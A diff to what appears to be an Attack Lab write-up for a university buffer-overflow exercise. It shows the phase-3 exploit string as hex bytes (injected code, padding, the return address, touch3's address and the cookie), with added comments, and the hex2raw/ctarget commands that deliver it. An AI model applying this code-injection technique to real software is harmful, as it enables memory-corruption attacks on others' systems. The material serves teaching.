@@ -34,16 +34,16 @@ http://www.unit-conversion.info/texttools/hexadecimal/
 37 36 65 62 64 62 35 36
 
 phase3.txt:
-48 c7 c7 d0 a0 61 55 c3
+48 c7 c7 d0 a0 61 55 c3 (included in padding)
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00
-88 a0 61 55 00 00 00 00
-32 19 40 00 00 00 00 00
-37 36 65 62 64 62 35 36
+88 a0 61 55 00 00 00 00 (rsp from phase 2 - not included in padding)
+32 19 40 00 00 00 00 00 (address of touch3 in little endian - also not included)
+37 36 65 62 64 62 35 36 (hex-to-text of cookie - also not included)
 
 ./hex2raw < phase3.txt > raw-phase3.txt
 ./ctarget < raw-phase3.txt
